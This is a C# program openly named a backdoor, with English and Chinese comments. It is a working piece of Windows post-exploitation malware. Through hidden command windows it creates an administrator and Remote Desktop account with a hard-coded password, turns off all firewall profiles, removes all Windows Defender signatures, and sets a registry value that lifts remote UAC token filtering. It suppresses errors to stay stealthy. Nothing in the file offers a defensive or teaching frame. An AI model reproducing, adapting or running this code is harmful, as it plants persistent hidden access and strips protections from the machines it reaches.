using System;
using System.Diagnostics;
using Microsoft.Win32;

class Backdoor
{
    static void Main()
    {
        // --- User & Group Creation ---
        // 创建新用户并加入管理员组和远程桌面组
        Cmd("net user rasalghul Test123456 /add");                // Add user
        Cmd("net localgroup Administrators rasalghul /add");      // Elevate to admin
        Cmd("net localgroup \"Remote Desktop Users\" rasalghul /add"); // Allow RDP

        // --- Firewall ---
        // 关闭所有配置文件的防火墙
        Cmd("netsh advfirewall set allprofiles state off");      // Disable all firewall profiles

        // --- Defender ---
        // 移除 Windows Defender 所有病毒定义，使其失效
        Cmd("\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All"); // Remove all AV signatures

        // --- Remote UAC Bypass ---
        // 解除远程UAC限制，允许本地管理员通过SMB获得完整令牌
        SetRemoteUacBypass();                                    // Allow full admin token over network
    }

    // Set LocalAccountTokenFilterPolicy = 1 to disable remote UAC token filtering
    // 设置 LocalAccountTokenFilterPolicy = 1，允许本地管理员在网络登录时保留完整管理员令牌
    static void SetRemoteUacBypass()
    {
        try
        {
            const string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
            const string valueName = "LocalAccountTokenFilterPolicy";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true))
            {
                if (key != null)
                {
                    key.SetValue(valueName, 1, RegistryValueKind.DWord);
                }
                else
                {
                    // Create key if missing
                    // 如果键不存在则创建
                    using (RegistryKey newKey = Registry.LocalMachine.CreateSubKey(keyPath))
                    {
                        newKey?.SetValue(valueName, 1, RegistryValueKind.DWord);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Silent fail to maintain stealth
            // 静默失败保持隐蔽
            Console.WriteLine("[-] Failed to set LocalAccountTokenFilterPolicy: " + ex.Message);
        }
    }

    // Execute a hidden command and wait for completion
    // 隐藏执行命令并等待完成
    static void Cmd(string args)
    {
        try
        {
            Process.Start(new ProcessStartInfo("cmd.exe", "/c " + args)
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            })?.WaitForExit();
        }
        catch { } // Ignore all exceptions to stay stealthy / 忽略所有异常保持隐蔽
    }
}